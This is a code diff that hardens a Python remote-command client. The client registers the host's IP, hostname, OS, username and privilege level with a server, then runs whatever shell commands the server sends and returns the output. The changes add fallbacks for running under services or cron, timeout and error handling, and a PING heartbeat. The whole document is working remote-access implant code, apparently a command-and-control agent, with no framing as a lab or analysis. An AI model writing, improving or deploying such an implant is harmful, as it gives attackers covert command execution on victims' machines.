@@ -3,6 +3,7 @@ import os
 import subprocess
 import platform
 import ctypes
+import getpass
 
 SERVER = 'localhost'
 SERVER_PORT = 9999
@@ -27,6 +28,7 @@ def is_elevated():
 def get_ip_address():
     try:
         # Gets the actual IP address by connecting to a public IP
+        # Use a UDP socket to avoid sending actual data
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
             s.connect(("8.8.8.8", 80))
             return s.getsockname()[0]
@@ -34,9 +36,13 @@ def get_ip_address():
         return "Unavailable"
 
 def close_connection(client_sock, msg="no message specified"):
-    msg_to_send = f"KILL_R {msg}"
-    client_sock.send(msg_to_send.encode())
-    client_sock.close()
+    try:
+        msg_to_send = f"KILL_R {msg}"
+        client_sock.send(msg_to_send.encode())
+    except Exception:
+        pass  # Avoid double-fault if socket is already closed
+    finally:
+        client_sock.close()
 
 def main():
 
@@ -44,7 +50,11 @@ def main():
     sys_os = platform.system()
     hostname = socket.gethostname()
     ipaddress = get_ip_address()
-    cur_user = os.getlogin()
+    try:
+        cur_user = os.getlogin()
+    except OSError:
+        # getlogin can fail in services/cron; fallback:
+        cur_user = getpass.getuser()
     elevated = is_elevated()
     sys_info = f"REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"
 
@@ -58,12 +68,15 @@ def main():
         client_sock.send(sys_info.encode())
         response = client_sock.recv(BUFFER_SIZE).decode()
         if not response.startswith("REG_R"):
-            raise ValueError
+            raise ValueError("Did not receive expected REG_R from server")
 
         # Await input from server and execute
         while True:
             try:
                 response = client_sock.recv(BUFFER_SIZE).decode()
+                if not response:
+                    raise ConnectionResetError  # Socket closed on server side
+                
                 if response.startswith("CMD "):
                     # Give it 60 seconds to run before failing
                     command = response[len("CMD "):]
@@ -72,17 +85,28 @@ def main():
                     # output = result.stdout + result.stderr
                     output = f"CMD_R {result.returncode} | {result.stdout} | {result.stderr}"
                     client_sock.send(output.encode())
+
                 if response.startswith("KILL"):
                     close_connection(client_sock,"server requested kill")
                     exit()
-            except ConnectionResetError:
-                print(f"Client has lost connection to server")
-                client_sock.close()
-                exit()
+
+                if response.startswith("PING"):
+                    client_sock.send("PONG".encode())
+
+            except subprocess.TimeoutExpired:
+                output = "CMD_R 124 | Command timed out | Command timed out"
+                client_sock.send(output.encode())
+            except (ConnectionResetError, ConnectionAbortedError):
+                close_connection(client_sock,"Client has lost connection to server.")
+                return
+            except Exception as e:
+                print(f"Unexpected error: {e}")
+                close_connection(client_sock, str(e))
+                return
 
     except Exception as e:
         # Graceful exit before crash
-        close_connection(client_sock,e)
+        close_connection(client_sock,str(e))
         raise e
 
 main()
